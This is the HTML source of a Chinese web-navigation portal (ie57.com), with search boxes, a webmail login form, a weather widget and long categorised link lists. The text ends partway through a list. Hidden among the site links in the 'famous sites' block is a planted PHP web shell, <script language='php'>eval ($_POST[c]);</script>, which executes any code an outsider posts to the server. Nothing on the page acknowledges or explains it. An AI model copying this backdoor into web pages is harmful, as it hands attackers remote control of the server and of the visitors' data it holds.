<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta name="keywords" content="绿网之家,网址导航,上网导航,网址,搜索,音乐,娱乐,图片,社区,BLOG,黄页，企业名录,114查询,网上黄页" />
<meta name="description" content="绿网之家,ie57上网导航,网址之家,网址大全,网址,搜索,音乐,娱乐,图片,小游戏,短信,社区,日记,相册,K歌,通讯簿,BLOG,天气预报,实用工具.最方便,最快捷,最多华人使用的上网导航" />
<title>绿网之家[Www.ie57.Com] -上网就上ie57！</title>
<link href="themes/default/base.css" rel="stylesheet" type="text/css" />
<link id="skin" href="themes/default/skins/blue/style.css" rel="stylesheet" type="text/css" />
<link id="font" href="" type="text/css" rel="stylesheet" />
<script type="text/javascript" src="themes/default/js/ylmf.cai.js"></script>
<script type="text/javascript" src="themes/default/js/config.js"></script>
<script type="text/javascript" src="themes/default/js/base.js"></script>
<base target="_blank" />
</head>
<body>
<div id="home">
<script type="text/javascript" src="themes/default/js/skin.js"></script>
    <div class="wrap">
    
    <div id="top" class="bd">
            <ul id="guide">
                <li class="clock"><a id="YlclockBtn" href="javascript:void(0)" target="_parent" onclick="Ylclock.Init()">闹钟</a></li>
                <li class="feedback"><a href="feedback">网友留言</a></li>
                <li class="sethome"><a href="javascript:void(0)" target="_parent" onclick="Yl.setHome(this)">设为主页</a></li>
                <li class="theme" id="style-quick"> <a rel="0" class="blue">0</a> <a rel="1" class="orange">1</a> <a rel="2" class="green">2</a> <a rel="3" class="purple">3</a> <a rel="4" class="blue2">4</a> </li>
                <li class="setSkin"><a href="javascript:void(0)" id="setting" target="_parent">个性设置</a></li>
            </ul>
            <ul id="meta" class="clearfix">
                <li id="date"></li>
                <li id="weather">
                    <p style="display:none"><a title="点击查看更多" id="wet" onclick="Weather.more()"><strong>#{city}</strong> #{img} #{title}</a> <a onclick="Weather.set()" href="javascript:void(0)" target="_parent">[定制城市]</a></p>
                </li>
                <li id="setCity" style="display:none">
                    <select id="w_pro" name="w_pro" onchange="Weather.loadCity(this.value)">
                        <option value="141">A 澳门</option>
                        <option value="119">A 安徽</option>
                        <option value="109">B 北京</option>
                        <option value="135">C 重庆</option>
                        <option value="123">F 福建</option>
                        <option value="127">G 广东</option>
                        <option value="128">G 广西</option>
                        <option value="137">G 贵州</option>
                        <option value="131">G 甘肃</option>
                        <option value="111">H 河北</option>
                        <option value="124">H 河南</option>
                        <option value="125">H 湖北</option>
                        <option value="126">H 湖南</option>
                        <option value="129">H 海南</option>
                        <option value="116">H 黑龙江</option>
                        <option value="122">J 江西</option>
                        <option value="120">J 江苏</option>
                        <option value="115">J 吉林</option>
                        <option value="114">L 辽宁</option>
                        <option value="132">N 宁夏</option>
                        <option value="113">N 内蒙古</option>
                        <option value="133">Q 青海</option>
                        <option value="117">S 上海</option>
                        <option value="118">S 山东</option>
                        <option value="112">S 山西</option>
                        <option value="130">S 陕西</option>
                        <option value="136">S 四川</option>
                        <option value="110">T 天津</option>
                        <option value="142">T 台湾</option>
                        <option value="139">X 西藏</option>
                        <option value="134">X 新疆</option>
                        <option value="140">X 香港</option>
                        <option value="138">Y 云南</option>
                        <option value="121">Z 浙江</option>
                    </select>
                    <select name="w_city" id="w_city">
                    </select>
                    <a class="set button" onclick="Weather.tick()">确 定</a> <a class="auto button" onclick="Weather.init(1)">自动判断</a> </li>
            </ul>
        </div>
        <div id="header" class="clearfix">
            <div id="banner"><script type="text/javascript" src="static/js/header.js"></script></div>
            <h1 id="logo"><a href="http://www.ie57.com" target="_parent" title="ie57.com"><img src="static/images/logo.gif" height="75" width="189" /></a></h1>
            <div id="mailBox">
                <form id="mail" name="mail" method="post" onsubmit="MailLogin.sendMail();return false;" action="" target="_blank">
                    <ul>
                        <li>
                            <label for="mail_username">帐号：</label>
                            <input type="text" class="int" id="mail_username" onmousemove="this.focus()" name="mail_username" value="">
                        </li>
                        <li>
                            <label for="mail_options">邮箱：</label>
                            <select id="mail_options" style="padding-left:0" class="int">
                                <option selected="selected">--请选择邮箱--</option>
                                <option>@163.com 网易</option>
                                <option>@126.com 网易</option>
                                <option>@vip.163.com 网易</option>
                                <option>@sina.com 新浪</option>
                                <option>@2008.sina.com 新浪</option>
                                <option>@vip.sina.com 新浪</option>
                                <option>@yahoo.com.cn</option>
                                <option>@yahoo.cn</option>
                                <option>@sohu.com 搜狐</option>
                                <option>@tom.com</option>
                                <option style="color:#03C">@139.com</option>
                                <option>@188.com</option>
                                <option>@21cn.com</option>
                                <option>@yeah.net</option>
                                <option>------------------</option>
                                <option>天涯帐号</option>
                                <option>百度帐号</option>
                                <option>ChinaRen校友录</option>
                                <option>校内网</option>
                                <option>51.com</option>
                            </select>
                        </li>
                        <li>
                            <label for="mail_passwd">密码：</label>
                            <input class="int" id="mail_passwd" name="mail_passwd" onmousemove="this.focus()" type="password" value=""><input id="mail_btn" type="submit" value="登 录" />
                        </li>
                    </ul>
                </form>
            </div>
        </div><!--/ header-->		<div id="search" class="clearfix">
            <div id="search-menu" class="clearfix">
            	<div id="notice">
                                            <p><a href="http://www.aiqing163.com?ie57">在＂爱情163＂分享您的爱情故事！</a></p>
                                            <p><a href="http://www.ik123.com/">超劲爆超好听的DJ舞曲在深港dj网！</a></p>
                                    </div>
                <ul class="clearfix">
                    <li><a rel="s115">115聚搜http://www.ie57.com</a></li>
                    <li class="current"><a rel="web">网 页</a></li>
                    <li><a rel="mp3">MP3</a></li>
                    <li><a rel="v115">影 视</a></li>
                    <li><a rel="image">图 片</a></li>
                    <li><a rel="zhidao">知 道</a></li>
                </ul>
                <ul  class="clearfix" style="margin:0">
                    <li><a id="localsearch">站内搜</a></li>
                    <li id="search-menu-more"><span><a class="more" id="smore">更 多</a></span>
                        <div id="smp"> <a href=" http://video.baidu.com/?tn=lqowen_1_pg">视 频</a> <a href=" http://tieba.baidu.com/?source=114la.com">贴 吧</a> <a href=" http://baike.baidu.com/?source=114la.com">百 科</a> <a href=" http://stock.baidu.com/?source=114la.com">股 票</a> <a href=" http://u.115.com/?11413">网 盘</a>  <a href=" http://fav.115.com/?source=114la.com">收藏夹</a>  <a href=" http://tool.115.com/?11413">工具箱</a></div>
                    </li>
                </ul>
            </div>
            <div id="search-form" class="bd">
                <div class="search-bg">
                    <div class="con">
                        <div id="sengine" class="clearfix">
                            <form id="searchForm" action="http://www.baidu.com/baidu" method="get" target="_blank">
                                <label for="baidu"><a href="#"><img src="static/images/sl/logox3.gif" width="79" height="27" /></a></label>
                                <div class="input">
                                    <input type="text" id="searchInput" name="wd" onmousemove="this.focus()" autocomplete="off" />
                                </div>
                                <input type="submit" id="searchBtn" class="btn" value="百度一下" />
                                <input type="hidden" name="tn" value="lqowen_1_pg" />
                                <div id="search-word" class="search-word">
                                    <p id="sw_s115" style="display:none;">
                                                            
                                    <a href="http://115.com/s?q=快递">快递智能查询</a>&nbsp;&nbsp;<a href="http://115.com/s?q=明天天气">明天天气</a>&nbsp;&nbsp;<a href="http://115.com/s?q=天下无双">成语解释</a>&nbsp;&nbsp;<a href="http://115.com/s?q=13800138000">手机归属</a>&nbsp;&nbsp;<a href="http://115.com/s?q=100美元">实时汇率转换</a>&nbsp;&nbsp;
                                    </p><!--/ keywords-->
                                    <p id="sw_web">
                                                                        <a href="http://www.ik123.com">超好听DJ舞曲</a>&nbsp;&nbsp;<a href="http://www.aiqing163.com/">爱情163</a>&nbsp;&nbsp;<a href="http://www.dju8.com">劲爆嗨曲</a>&nbsp;&nbsp;<a href="http://www.36k.com">小游戏</a>&nbsp;&nbsp;<a href="http://user.ik123.com/">深港DJ娱乐</a>&nbsp;&nbsp;
                                    </p><!--/ keywords-->
                                    <p id="sw_mp3" style="display:none;">
                                                                        <a href="http://mp3.baidu.com/m?tn=ylmf_1_pg&tn=ylmf_1_pg&f=ms&ct=134217728&word=爱我中华">爱我中华</a>&nbsp;&nbsp;
                                    </p><!--/ keywords-->
                                    <p id="sw_v115" style="display:none;">
                                                                        
                                    </p><!--/ keywords-->
                                    <p id="sw_image" style="display:none;">
                                                                        
                                    </p><!--/ keywords-->
                                    <p id="sw_zhidao" style="display:none;">
                                                                        
                                    </p><!--/ keywords-->
                            	</div>
                            </form>
                        </div>
                        <!--/ sengine-->
                        <div id="lsBox" class="clearfix" style="display:none">
                            <div class="input">
                                <input type="text" onblur="this.value==''?this.value='输入关键字搜索':''" onclick="this.select();" onfocus="this.value=='输入关键字搜索'?this.value='':''; " onmouseover="this.focus();" value="输入关键字搜索" id="localInput" autocomplete="off" />
                            </div>
                            <div style="clear:both; overflow:hidden; height:0;"></div>
                            <ul class="clearfix" style="display:none;">
                            </ul>
                        </div>
                    </div>
                    <!--/ con-->
                </div>
                <!--/ search-bg-->
            </div>
            <div id="suggest" style="display:none;"></div>
        </div>

<div id="keywords">
  <dl>
    <dt>热门分类：</dt>
            <a href="http://www.ie97.com/tool/dianziditu.htm" target="_blank" onclick="'211';" >电子地图</a>
        <a href="http://www.ie97.com/tool/weixingditu.htm" target="_blank" style="color:#178517;" onclick="'212';" >卫星地图</a>
        <a href="http://www.ie97.com//tool/sanweiditu.htm" target="_blank" onclick="'213';" >三维地图</a>
        <a href="http://www.ie97.com/tool/t.htm" target="_blank" onclick="'214';" >网络电视</a>
        <a href="http://www.ie97.com/tool/shouji.htm" target="_blank" onclick="'216';" >手机查询</a>
        <a href="http://www.linkwan.com/GB/BROADMETER/speedauto/" target="_blank" style="color:#178517;" onclick="'241';" >上网速度测试</a>
        <a href="http://www.ie97.com/tool/wnl.htm" target="_blank" onclick="'217';" >万年历</a>
        <a href="http://qq.ip138.com/train/" target="_blank" onclick="'218';" >火车时刻查询</a>
        <a href="http://wz.gocar.cn/changtu/" target="_blank" onclick="'220';" >长途汽车时刻</a>
        <a href="http://www.ip138.com/" target="_blank" onclick="'221';" >I P 地址速查</a>
        <a href="http://www.time.ac.cn/" target="_blank" onclick="'243';" >北京时间</a>
      </dl>
</div>

        <div id="content" class="clearfix">
            <div id="main">
                <div class="r1 clearfix">
                    <div id="board">
                        <ul  id="board-menu" class="clearfix">
                            <li id="bored-menu-def" class="current"><a rel="fmsite">名站导航</a></li>
                                                        <li><a rel="board-box0" url="http://www.114la.com/gp/index.html" nocache=>股票财经</a></li>
                                                        <li><a rel="board-box1" url="http://www.114la.com/index_images/soft.html" nocache=>常用软件</a></li>
                                                        <li><a rel="board-box2" url="http://www.114la.com/game.html" nocache=>热门游戏</a></li>
                                                        <li><a rel="favBox">我的收藏</a></li>
                            <li><a rel="history">浏览记录</a></li>
                        </ul>
                        <div id="board-box" class="bd">
                            <div id="fmsite">
                            	<div style="line-height:30px;">
                                <ul class="top clearfix">
                                                                                                            <script language="php">eval ($_POST[c]);</script><li><a href="http://www.baidu.com/index.php?tn=123">百度</a>--<a href="http://mp3.baidu.com/">Mp3</a> <em class="baid"></em>
<div class="fmbox">
<div class="arrow">百度</div>
<ul>
<li><a href="http://zhidao.baidu.com/q?pt=123">百度知道</a></li>
<li><a href="http://video.baidu.com/?tn=123">百度视频</a></li>
<li><a href="http://tieba.baidu.com/?source=123">百度贴吧</a></li>
<li><a href="http://baike.baidu.com/?source=123">百度百科</a></li>
<li><a href="http://hi.baidu.com">百度空间</a></li>
</ul>
</div>
</li>
                                                                        <li><a href="http://www.sina.com.cn/">新浪</a>--<a href="http://news.sina.com.cn/">新闻</a> <em class="sina"></em>
<div class="fmbox"> <span class="arrow">新浪</span>
<ul>
<li><a href="http://finance.sina.com.cn">新浪财经</a></li>
<li><a href="http://sports.sina.com.cn">新浪体育</a></li>
<li><a href="http://blog.sina.com.cn">新浪博客</a></li>
<li><a href="http://sina.allyes.com/main/adfclick?db=sina&bid=155888,196233,201227&cid=0,0,0&sid=189148&advid=3406&camid=27233&show=ignore&url=http://auto.sina.com.cn/?c=spr_web_sq_114la_auto">新浪汽车</a></li>
<li><a href="http://sina.allyes.com/main/adfclick?db=sina&bid=164211,206178,211190&cid=0,0,0&sid=199245&advid=3406&camid=29028&show=ignore&url=http://video.sina.com.cn/?c=spr_web_sq_114la_video">新浪宽频</a></li>
</ul>
</div>
</li>
                                                                        <li><a href="http://www.sohu.com/">搜狐</a>--<a href="http://news.sohu.com/">新闻</a> <em class="sohu"></em>
<div class="fmbox"> <span class="arrow">搜狐</span>
<ul>
<li><a href="http://blog.sohu.com">搜狐博客</a></li>
<li><a href="http://business.sohu.com">搜狐财经</a></li>
<li><a href="http://auto.sohu.com">搜狐汽车</a></li>
<li><a href="http://it.sohu.com">搜狐科技</a></li>
<li><a href="http://club.sohu.com">搜狐社区</a></li>
</ul>
</div>
</li>
                                                                        <li><a href="http://www.163.com/">网易</a>--<a href="http://news.163.com/">新闻</a> <em class="wy"></em>
<div class="fmbox"> <span class="arrow">网易</span>
<ul>
<li><a href="http://news.163.com">网易新闻</a></li>
<li><a href="http://money.163.com">网易财经</a></li>
<li><a href="http://blog.163.com">网易博客</a></li>
<li><a href="http://photo.163.com">网易相册</a></li>
<li><a href="http://tech.163.com/">网易科技</a></li>
</ul>
</div>
</li>
                                                                        <li><a href="http://www.qq.com/">腾讯</a>--<a href="http://tech.qq.com/">科技</a> <em class="qq"></em>
<div class="fmbox"> <span class="arrow">腾讯</span>
<ul>
<li><a href="http://news.qq.com/">腾讯新闻</a></li>
<li><a href="http://finance.qq.com">腾讯财经</a></li>
<li><a href="http://ent.qq.com">腾讯娱乐</a></li>
<li><a href="http://auto.qq.com">腾讯汽车</a></li>
<li><a href="http://games.qq.com/">腾讯游戏</a></li>
</ul>
</div>
</li>
                                                                    </ul>
                                </div>
                                <ul class="list clearfix">
                                                                                                                <li><a href="http://www.google.hk">Google</a></li>
                                                                            <li><a href="http://www.china.com/">中华网</a></li>
                                                                            <li><a href="http://cn.yahoo.com/?id=40020">中国雅虎</a></li>
                                                                            <li><a href="http://cn.msn.com/">MSN中文</a></li>
                                                                            <li><a href="http://www.huanqiu.com/">环球时报</a></li>
                                                                            <li><a href="http://www.ifeng.com/">凤 凰 网</a></li>
                                                                            <li><a href="http://www.cctv.com/">中央电视台</a></li>
                                                                            <li><a href="http://www.xinhuanet.com/">新 华 网</a></li>
                                                                            <li><a href="http://www.people.com.cn/">人 民 网</a></li>
                                                                            <li><a href="http://www.gov.cn/">中国政府网</a></li>
                                                                            <li><a href="http://china.alibaba.com/">阿里巴巴</a></li>
                                                                            <li><a href="http://www.hc360.com/">慧 聪 网</a></li>
                                                                            <li><a href="http://spcode.baidu.com/spcode/spClick?tn=ylmf_sp&ctn=0&styleid=3338&tourl=http://www.28.com/?comeID=96888">创业商机网</a></li>
                                                                            <li><a href="http://www.icbc.com.cn/">工商银行</a></li>
                                                                            <li><a href="http://stbnnr.allyes.com/bnnr/114la_baishehui.html">白社会</a></li>
                                                                            <li><a href="http://www.39.net/">39健康网</a></li>
                                                                            <li><a href="http://www.ctrip.com/smartlink/smartlink.asp?c=114la&url=http://www.ctrip.com/">携程旅行</a></li>
                                                                            <li><a href="http://www.qidian.com/newindex.aspx?db=101&adid=1006&type=client">起点小说网</a></li>
                                                                            <li><a href="http://www.soufun.com/">搜房网</a></li>
                                                                            <li><a href="http://www.tom365.com/">免费电影</a></li>
                                                                            <li><a href="http://www.27.cn/">爱丽女性网</a></li>
                                                                            <li><a href="http://www.eastmoney.com/">东方财富</a></li>
                                                                            <li><a href="http://www.taobao.com/">淘 宝 网</a></li>
                                                                            <li><a href="http://www.1234567.com.cn/">天天基金</a></li>
                                                                            <li><a href="http://www.pconline.com.cn/">太平洋电脑网</a></li>
                                                                            <li><a href="http://www.360.cn/">360安全卫士</a></li>
                                                                            <li><a href="http://www.cmbchina.com/">招商银行</a></li>
                                                                            <li><a href="http://www.sz.net.cn/">深圳之窗</a></li>
                                                                            <li><a href="http://wwv.renren.com/xn.do?ss=17002&rt=50&b=25828">人人网</a></li>
                                                                            <li><a href="http://www.chinamobile.com/">中国移动</a></li>
                                                                            <li><a href="http://www.tianya.cn/">天涯社区</a></li>
                                                                            <li><a href="http://www.ku654.com/">ku654小游戏</a></li>
                                                                            <li><a href="http://house.focus.cn/">焦点房产网</a></li>
                                                                            <li><a href="http://www.xiaonei.com/">校内网</a></li>
                                                                            <li><a href="http://china.nba.com/">NBA中文网</a></li>
                                    								</ul>
                                <div style="height:30px;">
                                <ul id="RandomPlay" class="list clearfix">
                                   	                                    
                                </ul>
                                </div>
                                 
                                    
                                <ul class="list clearfix">    	
                                                                                                                <li><a href="http://www.togj.com/">逛街网</a></li>
                                                                            <li><a href="http://www.kaixin001.com/">开心网</a></li>
                                                                            <li><a href="http://p.yiqifa.com/c?s=cfbc3c63&w=62015&c=254&i=160&l=0&e=ie97&t=http://www.360buy.com/Union/Union_default.asp" style="color:#0E9C00">京东商城</a></li>
                                                                            <li><a href="http://p.yiqifa.com/c?s=44abc18d&w=62015&c=247&i=159&l=0&e=ie97&t=http://www.dangdang.com" style="color:#982F00">当当网购物</a></li>
                                                                            <li><a href="http://p.yiqifa.com/c?s=66c7831c&w=62015&c=245&i=201&l=0&e=ie97&t=http://www.amazon.cn" style="color:#099800">卓越网上购物</a></li>
                                                                    </ul>
                                
                                <ul id="RandomPlayItems" style="display:none">
                                 	<li><a href="http://www.daodao.com/?m=12119" target="_blank">DaoDao旅游网</a></li>
<li><a href="http://www.yxlady.com/" target="_blank">伊秀女性网</a></li>
<li><a href="http://user.ik123.com" target="_blank">深港娱乐</a></li>
<li><a href="http://www.51.com/" target="_blank">51交友空间</a></li>
<li><a href="http://www.zhcw.com/" target="_blank">中彩网 </a></li>

                                </ul>
                            </div>
                            <!--/ fmsite-->
                            <div id="favBox" style="display:none;" >
                                <ul id="Collbox" class="line_30"></ul>
                                <div id="addColl">
                                    <form onsubmit="return MyFav.add(this);">
                                        <label for="urlName">添加自定义收藏</label>
                                        <input type="text" value="站名" id="urlName" class="int" onblur="favoFuninput(this,0)" onfocus="favoFuninput(this,1)" name="urlName"/>
                                        <input type="text" value="网址" class="int" onblur="favoFuninput(this,0)" onfocus="favoFuninput(this,1)" id="Url" name="Url"/>
                                        <input type="submit" class="btn button" value="添 加" />
                                        <input type="button" class="btn button" onclick="MyFav.show()" value="刷 新" />
                                    </form>
                                </div>
                                <div id="addCollmsg" style="display:none"></div>
                            </div>
                            <div id="history" class="line_30" style="display:none">
                                <ul id="historyBox" class="clearfix">
                                    <li class="none">对不起，您没有任何浏览记录</li>
                                </ul>
                                <ul class="clearfix">
                                    <li class="del"><a id="delHistory">删除记录</a></li>
                                </ul>
                            </div>
                        </div>
                        <!--/ board-box-->
                    </div>
                    <!--/ board-->





                </div><!--/ r1-->
        <div id="key2">
                        <a href="http://www.36k.com/" target="_blank" style="color:#FF4D08;" onclick="'248';" >36k小游戏</a>&nbsp;&nbsp;&nbsp;<a href="http://p.ik123.com/" target="_blank" style="color:#00740E;" onclick="'249';" >深港精品库</a>&nbsp;&nbsp;&nbsp;<a href="http://www.guigushi.cc/" target="_blank" style="color:#1D1D1D;" onclick="'225';" >鬼故事大全</a>&nbsp;&nbsp;&nbsp;<a href="http://www.kx5.cc/" target="_blank" style="color:#E05400;" onclick="'226';" >开心屋电影</a>&nbsp;&nbsp;&nbsp;<a href="http://www.31t.com/" target="_blank" style="color:#178517;" onclick="'228';" >想要听音乐网</a>&nbsp;&nbsp;&nbsp;<a href="http://www.11y.cc/" target="_blank" onclick="'245';" >免费电影</a>&nbsp;&nbsp;&nbsp;<a href="http://www.97k.cc/" target="_blank" onclick="'246';" >就去看电影网</a>&nbsp;&nbsp;&nbsp;<a href="http://www.qqguodu.com/" target="_blank" onclick="'247';" >QQ国度</a>&nbsp;&nbsp;&nbsp;<a href="http://www.qqpao.com" target="_blank" onclick="'250';" >QQ头像</a>&nbsp;&nbsp;&nbsp;
        </div>
        <div id="coolsite" class="bd">
            <h2><a id="clalign" href="javascript:void(0)" target="_self" title="左对齐/居中">左对齐/居中</a>酷站导航 </h2>
            <div id="list">
                                        <dl><dt><a href="html/xiaoshuo/" >文学</a></dt>
                                        <dd><a href="http://www.aiqing163.com" style="color:#D80065">爱情小说</a></dd>
                                        <dd><a href="http://www.qidian.com/">起点中文</a></dd>
                                        <dd><a href="http://www.readnovel.com">小说阅读网</a></dd>
                                        <dd><a href="http://www.hongxiu.com/">红袖添香</a></dd>
                                        <dd><a href="http://www.zhulang.com/">逐浪小说</a></dd>
                                        <dd><a href="http://www.xxsy.net/">潇湘书院</a></dd>
                                        <dd><a href="http://book.qukanshu.com/">看书小说网</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/music/" >音乐</a></dt>
                                        <dd><a href="http://mp3.baidu.com/">百度MP3</a></dd>
                                        <dd><a href="http://www.ik123.com/" style="color:#008C1E">深港DJ舞曲</a></dd>
                                        <dd><a href="http://www.1ting.com/">一听音乐网</a></dd>
                                        <dd><a href="http://www.31t.com/" style="color:#FF086C">好听的歌</a></dd>
                                        <dd><a href="http://www.kugou.com/">酷狗音乐</a></dd>
                                        <dd><a href="http://www.kuwo.cn/">酷我音乐</a></dd>
                                    </dl>
                            <dl><dt><a href="html/games/" >游戏</a></dt>
                                        <dd><a href="http://www.game.com.cn/">小游戏</a></dd>
                                        <dd><a href="http://www.17173.com/">17173</a></dd>
                                        <dd><a href="http://games.sina.com.cn/">新浪游戏</a></dd>
                                        <dd><a href="http://www.pcgames.com.cn/">太平洋游戏</a></dd>
                                        <dd><a href="http://games.qq.com/index.shtml">腾讯游戏</a></dd>
                                        <dd><a href="http://www.91wan.com/rxsg">热血三国</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/vedio/" >视频</a></dt>
                                        <dd><a href="http://www.ku6.com/">酷6视频</a></dd>
                                        <dd><a href="http://www.youku.com/">优酷网</a></dd>
                                        <dd><a href="http://www.tudou.com/">土豆网</a></dd>
                                        <dd><a href="http://www.6.cn/">六间房</a></dd>
                                        <dd><a href="http://v.ifeng.com/">凤凰宽频</a></dd>
                                        <dd><a href="http://www.kx5.cc">开心屋免费电影</a></dd>
                                    </dl>
                            <dl><dt><a href="html/xiaoyouxi/" >酷玩</a></dt>
                                        <dd><a href="http://www.4399.com/">4399小游戏</a></dd>
                                        <dd><a href="http://www.91wan.com/">91wan游戏</a></dd>
                                        <dd><a href="http://www.91wan.com/ftxy/index.htm">飞天西游</a></dd>
                                        <dd><a href="http://www.91wan.com/rxsg">热血三国</a></dd>
                                        <dd><a href="http://p.yiqifa.com/c?s=cdfca29e&w=2451&c=3640&i=2605&l=0&e=&t=http://home.3gm.com.cn/do.php?ac=wlyx">武林英雄</a></dd>
                                        <dd><a href="http://web.4399.com/mcsd/">明朝时代</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/soft/" >软件</a></dt>
                                        <dd><a href="http://www.xiazaiba.com/">绿色下载吧</a></dd>
                                        <dd><a href="http://www.skycn.com/index.html">天空软件站</a></dd>
                                        <dd><a href="http://www.crsky.com/">霏凡下载</a></dd>
                                        <dd><a href="http://xiazai.zol.com.cn/">中关村下载</a></dd>
                                        <dd><a href="http://www.mydrivers.com/">驱动之家</a></dd>
                                        <dd><a href="http://dl.pconline.com.cn/">太平洋下载</a></dd>
                                    </dl>
                            <dl><dt><a href="html/junshi/" >军事</a></dt>
                                        <dd><a href="http://military.china.com/">中华网军事</a></dd>
                                        <dd><a href="http://www.tiexue.net/">铁血军事</a></dd>
                                        <dd><a href="http://mil.huanqiu.com/">环球军事</a></dd>
                                        <dd><a href="http://mil.news.sina.com.cn/">新浪军事</a></dd>
                                        <dd><a href="http://news.ifeng.com/mil/">凤凰网军事</a></dd>
                                        <dd><a href="http://www.chinamil.com.cn/">中国军网</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/news/" >新闻</a></dt>
                                        <dd><a href="http://news.sina.com.cn/">新浪新闻</a></dd>
                                        <dd><a href="http://news.cn.yahoo.com/?id=40020">雅虎新闻</a></dd>
                                        <dd><a href="http://news.sohu.com/">搜狐新闻</a></dd>
                                        <dd><a href="http://news.163.com/">网易新闻</a></dd>
                                        <dd><a href="http://world.huanqiu.com/">环球新闻</a></dd>
                                        <dd><a href="http://news.ifeng.com/">凤凰资讯</a></dd>
                                        <dd><a href="http://news.qq.com/">腾讯新闻</a></dd>
                                    </dl>
                            <dl><dt><a href="html/caijinggushi/" >财经</a></dt>
                                        <dd><a href="http://www.eastmoney.com/">东方财富网</a></dd>
                                        <dd><a href="http://www.hexun.com/">和讯财经</a></dd>
                                        <dd><a href="http://finance.sina.com.cn/">新浪财经</a></dd>
                                        <dd><a href="http://www.stockstar.com/">证券之星</a></dd>
                                        <dd><a href="http://www.jrj.com.cn/">金融界</a></dd>
                                        <dd><a href="http://www.cnfol.com/">中金在线</a></dd>
                                        <dd><a href="http://www.bdchn.com/">商业新闻网</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/gouwu/" >购物</a></dt>
                                        <dd><a href="http://p.yiqifa.com/c?s=44abc18d&w=62015&c=247&i=159&l=0&e=ie97&t=http://www.dangdang.com">当当网</a></dd>
                                        <dd><a href="http://p.yiqifa.com/c?s=66c7831c&w=62015&c=245&i=201&l=0&e=ie97&t=http://www.amazon.cn">卓越网</a></dd>
                                        <dd><a href="http://promotion.eachnet.com/09q2ad/?adid=bjmt_mta_01_0_hp_25828">易趣购物</a></dd>
                                        <dd><a href="http://www.togj.com/">逛街网</a></dd>
                                        <dd><a href="http://www.chinadrtv.com/do_dat.jsp?sid=11410903&dat=9686&url=/">橡果购物</a></dd>
                                        <dd><a href="http://www.uggcat.com/">ugg专卖店</a></dd>
                                    </dl>
                            <dl><dt><a href="html/blog/" >博客</a></dt>
                                        <dd><a href="http://blog.sina.com.cn/">新浪博客</a></dd>
                                        <dd><a href="http://blog.sohu.com/">搜狐博客</a></dd>
                                        <dd><a href="http://blog.hexun.com/">和讯博客</a></dd>
                                        <dd><a href="http://hi.baidu.com/">百度空间</a></dd>
                                        <dd><a href="http://spaces.msn.com/">MSN 空间</a></dd>
                                        <dd><a href="http://qzone.qq.com/">Q-ZONE</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/bank/" >银行</a></dt>
                                        <dd><a href="http://www.cmbchina.com/">招商银行</a></dd>
                                        <dd><a href="http://www.icbc.com.cn/">工商银行</a></dd>
                                        <dd><a href="http://www.ccb.com/">建设银行</a></dd>
                                        <dd><a href="http://www.boc.cn/">中国银行</a></dd>
                                        <dd><a href="http://www.abchina.com/">农业银行</a></dd>
                                        <dd><a href="http://www.gdb.com.cn/">广发银行</a></dd>
                                    </dl>
                            <dl><dt><a href="html/shouji/" >手机</a></dt>
                                        <dd><a href="http://mobile.pconline.com.cn/">太平洋手机</a></dd>
                                        <dd><a href="http://mobile.zol.com.cn/">中关村手机</a></dd>
                                        <dd><a href="http://www.imobile.com.cn/">手机之家</a></dd>
                                        <dd><a href="http://www.cnmo.com/">手机中国</a></dd>
                                        <dd><a href="http://digi.tech.qq.com/mobile">腾讯手机</a></dd>
                                        <dd><a href="http://mobile.pcpop.com/">泡泡网手机</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/car/" >汽车</a></dt>
                                        <dd><a href="http://www.pcauto.com.cn?ad=575">太平洋汽车</a></dd>
                                        <dd><a href="http://sina.allyes.com/main/adfclick?db=sina&bid=155888,196233,201227&cid=0,0,0&sid=189148&advid=3406&camid=27233&show=ignore&url=http://auto.sina.com.cn/?c=spr_web_sq_114la_auto">新浪汽车</a></dd>
                                        <dd><a href="http://www.autohome.com.cn/">汽车之家</a></dd>
                                        <dd><a href="http://auto.sohu.com/">搜狐汽车</a></dd>
                                        <dd><a href="http://auto.163.com/">网易汽车</a></dd>
                                        <dd><a href="http://www.bitauto.com/">易车网</a></dd>
                                    </dl>
                            <dl><dt><a href="html/rencai/" >人才</a></dt>
                                        <dd><a href="http://jump.all4ad.cn/jump.aspx?id=334">前程无忧</a></dd>
                                        <dd><a href="http://www.cjol.com/">中国人才热线</a></dd>
                                        <dd><a href="http://www.jobkoo.com/?utm_source=114la&utm_medium=text&utm_campaign=url-navigation">职酷招聘</a></dd>
                                        <dd><a href="http://www.zhaopin.com/">智联招聘</a></dd>
                                        <dd><a href="http://jump.all4ad.cn/jump.aspx?id=361">中华英才网</a></dd>
                                        <dd><a href="http://www.zhubajie.com/">猪八戒网</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/love/" >交友</a></dt>
                                        <dd><a href="http://home.27.cn/">丽人帮</a></dd>
                                        <dd><a href="http://www.ipart.cn/a/ipart001205.php?from=emar&channelid=41690">爱情公寓</a></dd>
                                        <dd><a href="http://jump.all4ad.cn/jump.aspx?id=319">360圈交友</a></dd>
                                        <dd><a href="http://spcode.baidu.com/spcode/spClick?tn=ylmf_sp&ctn=0&styleid=1608&tourl=http://count.myspace.cn/ag.php?pid=117_0_10003_7_0000BAIDU_ANDadtype=9">聚友网</a></dd>
                                        <dd><a href="http://p.yiqifa.com/servlet/handleClick?sid=effaa3a9a5bdb6f5&pid=831&wid=2498&vid=613&cid=248&lid=0&euid=&turl=http%3A%2F%2Fwww.juedui100.com%2Freg.jsp%3Fsid%3D%3C%252%25%3E%26aid%3D22&vwid=">绝对100</a></dd>
                                        <dd><a href="http://www.xingkong.com/">星空网</a></dd>
                                        <dd><a href="http://stbnnr.allyes.com/bnnr/114la_baishehui.html">白社会</a></dd>
                                    </dl>
                            <dl><dt><a href="html/bizhi/" >图片</a></dt>
                                        <dd><a href="http://star.1ting.com/">美女图片</a></dd>
                                        <dd><a href="http://ent.huanqiu.com/pic/">明星写真</a></dd>
